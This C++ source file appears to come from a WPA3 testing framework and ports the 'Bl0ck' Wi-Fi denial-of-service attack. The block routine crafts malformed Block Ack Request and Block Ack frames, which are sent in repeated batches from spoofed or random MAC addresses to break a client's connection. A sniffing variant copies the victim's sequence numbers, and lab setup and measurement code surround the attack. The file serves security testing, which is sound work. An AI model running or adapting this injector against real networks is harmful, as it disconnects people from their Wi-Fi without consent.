#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "config/RunStatus.h"
#include "logger/log.h"

#include <random>
#include <chrono>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <memory>

#include "ex_program/hostapd/hostpad.h"
#include "system/ip.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "logger/error_log.h"
#include "observer/iperf_wrapper.h"
#include "observer/tshark_wrapper.h"
#include "system/hw_capabilities.h"

// rewrite from python https://github.com/efchatz/Bl0ck/tree/main?tab=readme-ov-file
namespace wpa3_tester::bl0ck_attack{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    RadioTap get_BAR_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw, const uint8_t fn, const uint16_t sn) {
        //for some reason is dst first
        Dot11BlockAckRequest bar(sta_hw, ap_hw); // AP(attacker) -> STA
        bar.fragment_number(fn);
        bar.start_sequence(sn);
        const vector<uint8_t> payload_data = {
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
        };
        const RadioTap rt{}; // fill with driver?
        return rt / bar / RawPDU(payload_data);
    }

    RadioTap get_BA_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw){
        Dot11BlockAck ba(ap_hw, sta_hw); // STA(attacker) -> AP
        ba.fragment_number(4); // invalid FN
        ba.start_sequence(1175); // random invalid SSN
        ba.bar_control(0x0004);
        const vector<uint8_t> payload_data = {
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
        };
        const RadioTap rt{}; // fill with driver?
        return rt / ba / RawPDU(payload_data);
    };

    RadioTap get_BARS_frame(const HWAddress<6> &ap_hw,
                            const HWAddress<6> &sta_hw,
                            const string& iface,
                            const int timeout_sec) {
        log(LogLevel::INFO, "BARS: Starting sniffer to capture QoS data from "+ sta_hw.to_string());

        struct SniffResult {
            bool found = false;
            uint8_t fn = 0;
            uint16_t sn = 0;
            mutex mtx;
            condition_variable cv;
        };

        auto result = make_shared<SniffResult>();

        // Lambda to handle captured packets
        auto packet_handler = [result, sta_hw](PDU& pdu) -> bool {
            try {
                const auto* dot11 = pdu.find_pdu<Dot11Data>();
                if (!dot11) return true;

                // check QoS data
                if (dot11->type() == Dot11::DATA && dot11->subtype() == 0x08) {
                    if (dot11->addr2() == sta_hw) { // check from the target STA
                        log(LogLevel::INFO, "BARS: Captured QoS data from %s to %s",
                            dot11->addr2().to_string().c_str(),
                            dot11->addr1().to_string().c_str());

                        // Extract sequence control field
                        lock_guard lock(result->mtx);
                        result->fn = dot11->frag_num();
                        result->sn = dot11->seq_num();
                        result->found = true;
                        result->cv.notify_one();
                        return false;
                    }
                }
            } catch (const exception& e) {
                log(LogLevel::WARNING, "BARS: Error processing packet: "+ e.what());
            }
            return true;
        };

        // sniffing in a separate thread
        thread sniffer_thread([iface, packet_handler, result]() {
            try {
                SnifferConfiguration config;
                config.set_promisc_mode(true);
                config.set_filter("type data subtype 0x08");
                Sniffer sniffer(iface, config);
                sniffer.sniff_loop(packet_handler);
            } catch (const exception& e) {
                log(LogLevel::ERROR, "BARS: Sniffer error: "+e.what());
                lock_guard lock(result->mtx);
                result->found = false;
                result->cv.notify_one();
            }
        });

        {  // Wait for QoS data or timeout
            unique_lock lock(result->mtx);
            if (!result->cv.wait_for(lock, seconds(timeout_sec), [result]() { return result->found; })) {
                log(LogLevel::ERROR, "BARS: Timeout waiting for QoS data from %s", sta_hw.to_string().c_str());
                throw runtime_error("BARS: Failed to capture QoS data within timeout");
            }
        }

        if (sniffer_thread.joinable()) {sniffer_thread.detach();}
        return get_BAR_frame(ap_hw, sta_hw, result->fn, result->sn);
    }

    void block(const string& STA_mac,
               const string& AP_mac,
               const string& iface,
               const int frame_num,
               const string& attack_type,
               const int duration_sec,
               const bool is_random) {
        assert(attack_type == "BAR" || attack_type == "BA" || attack_type == "BARS");

        log(LogLevel::INFO, "Starting BARorBA exploit - Type: %s", attack_type.c_str());

        const NetworkInterface iface_obj(iface);
        const HWAddress<6> ap_hw(AP_mac);
        PacketSender sender;

        log(LogLevel::INFO, "Sending frames - Duration: %d sec, Concurrent frames: %d", duration_sec, frame_num);

        const auto start_time = steady_clock::now();
        const auto end_time = start_time + seconds(duration_sec);

        RadioTap bars_frame;
        if (attack_type == "BARS") {
            //TODO BARS dont work
            const HWAddress<6> sta_hw = is_random ? HWAddress<6>(hw_capabilities::rand_mac()) : HWAddress<6>(STA_mac);
            bars_frame = get_BARS_frame(ap_hw, sta_hw, iface, 30);
            log(LogLevel::INFO, "BARS: Frame prepared with captured sequence number");
        }

        int iteration = 0;
        while (steady_clock::now() < end_time) {
            try {
                const HWAddress<6> sta_hw = is_random ? HWAddress<6>(hw_capabilities::rand_mac()) : HWAddress<6>(STA_mac);
                RadioTap block_frame;

                if (attack_type == "BAR") {block_frame = get_BAR_frame(ap_hw, sta_hw);}
                if (attack_type == "BA") {block_frame = get_BA_frame(ap_hw, sta_hw);}
                if (attack_type == "BARS") {block_frame = bars_frame;}

                log(LogLevel::DEBUG, "Sending batch %d", iteration);
                for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
                this_thread::sleep_for(100ms);
                iteration++;
            } catch (const exception& e) {
                log(LogLevel::ERROR, "Error sending frame at iteration %d: %s", iteration, e.what());
                throw;
            }
        }
        log(LogLevel::INFO, "Block attack completed after %d iterations", iteration);
    }

    void iperf_conn(RunStatus &rs, const string& src_client,  const string&  dst_server){
        observer::start_iperf3_server(rs,"iperf_server", dst_server);
        rs.process_manager.wait_for("iperf_server","Server listening on ", seconds(30));
        observer::start_iperf3(rs,"iperf_client", src_client, dst_server);
    };

    static string bpf_mac_at(const int offset, const string &mac) {
        // BPF cant filter 6 bytes at one filters //TODO
        // 4 byte: wlan[offset:4]
        // 2 byte: wlan[offset+4:2]

        unsigned int b[6];
        sscanf(mac.c_str(), "%x:%x:%x:%x:%x:%x", &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]);

        char buf[128];
        snprintf(buf, sizeof(buf),
            "(wlan[%d:4] == 0x%02x%02x%02x%02x and wlan[%d:2] == 0x%02x%02x)",
            offset,     b[0], b[1], b[2], b[3],
            offset + 4, b[4], b[5]);
        return string(buf);
    }

    static string bpf_mac_ra_or_ta(const string &mac) {
        return "(" + bpf_mac_at(4, mac) + " or " + bpf_mac_at(10, mac) + ")";
    }

    void speed_observation_start(RunStatus &rs, const string& bl0ck_att_type){
        //observer::start_musezahn(rs, "mz_gen", "client", "access_point");

        const string c_mac = rs.get_actor("client")["mac"];
        const string a_mac = rs.get_actor("attacker")["mac"];
        const string ap_mac = rs.get_actor("access_point")["mac"];

        const string mac_filter =
        "((wlan host " + c_mac + " or wlan host " + a_mac + " or wlan host " + ap_mac + ")"
        " and ((wlan[0] & 0xfc) == 0x88"    // QoS Data
        " or (wlan[0] & 0xfc) == 0xd0))"   // Action (ADDBA)
        // BAR/BA — MAC filters without offset
        " or ((wlan[0] & 0xfc) == 0x84 and (" +
        bpf_mac_ra_or_ta(c_mac) + " or " +
        bpf_mac_ra_or_ta(a_mac) + " or " +
        bpf_mac_ra_or_ta(ap_mac) + "))" +
        " or ((wlan[0] & 0xfc) == 0x94 and (" +
        bpf_mac_ra_or_ta(c_mac) + " or " +
        bpf_mac_ra_or_ta(a_mac) + " or " +
        bpf_mac_ra_or_ta(ap_mac) + "))";

        observer::start_tshark(rs, "attacker", mac_filter); //FIXME
        observer::start_tshark(rs, "client", mac_filter); //FIXME
        //observer::start_tshark(rs, "access_point", mac_filter);
        this_thread::sleep_for(seconds(10));//FIXME wait for tshark

        iperf_conn(rs, "client",  "access_point");
    }

    void setup_attack(RunStatus& rs){
        if (rs.config.at("actors").at("access_point").at("source") != "internal"
            || rs.config.at("actors").at("client").at("source") != "internal") {
            throw runtime_error("only internal actors are supported");
            }

        // -------- hostapd AP ------------
        hostapd::run_hostapd(rs, "access_point");
        rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(20));
        log(LogLevel::INFO, "access_point is running");
        ip::set_ip(rs, "access_point");

        // -------- wpa_supplicant STA ------------
        hostapd::run_wpa_supplicant(rs, "client");
        rs.process_manager.wait_for("client", "Successfully initialized wpa_supplicant", seconds(10));
        ip::set_ip(rs, "client");

        rs.process_manager.wait_for("client", "EVENT-CONNECTED", seconds(40));
        rs.process_manager.wait_for("access_point", "EAPOL-4WAY-HS-COMPLETED", seconds(30));
        log(LogLevel::INFO, "client is connected");
    }


    void run_bl0ck_attack(RunStatus& rs){
        const auto& att_cfg = rs.config.at("attack_config");
        const auto& attacker = rs.get_actor("attacker");
        const string iface   = attacker["iface"];

        const string STA_mac = rs.get_actor("client")["mac"];
        const string AP_mac = rs.get_actor("access_point")["mac"];

        const string bl0ck_att_type = att_cfg.at("attack_variant").get<string>();
        const int duration = att_cfg.at("attack_time_sec").get<int>();
        const int frame_num = att_cfg.at("frame_number").get<int>();
        const bool is_random = att_cfg.at("random").get<bool>();

        speed_observation_start(rs, bl0ck_att_type);

        log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
        this_thread::sleep_for(seconds(10));
        block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
        this_thread::sleep_for(seconds(10));
        log(LogLevel::INFO, "Block Attack END");
    }

    void stats_bl0ck_attack(const RunStatus& rs){
        log(LogLevel::INFO , "Bl0ck attack stats");

        vector<observer::graph_lines> events;
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN", "red"});
        events.push_back({get_time_logs(rs, "client", "@START"),"START","black"});
        events.push_back({get_time_logs(rs, "client", "@END"),"END","black"});

        events.push_back({
            observer::get_tshark_events(rs, "attacker",
                "wlan.fc.type_subtype == 0x000d", "ADDBA")
            ,"ADDBA","blue"});
        events.push_back({
            observer::get_tshark_events(rs, "attacker",
                "(wlan.fc.type_subtype == 0x0018) && (wlan.fixed.ssc.fragment == 4)","BA_fn4")
            ,"BA_fn4","cyan"});
        events.push_back({
          observer::get_tshark_events(rs, "attacker",
              "(wlan.fc.type_subtype == 0x0019) && (wlan.fixed.ssc.fragment == 4)","BA_fn4")
          ,"BA_fn4","purple"});

        observer::tshark_graph(rs, "attacker", events);
        observer::tshark_graph(rs, "client", events);
        //observer::tshark_graph(rs, "access_point", events);

        // TODO iperf graphs
        log(LogLevel::INFO, "Bl0ck attack stop");
    }
}
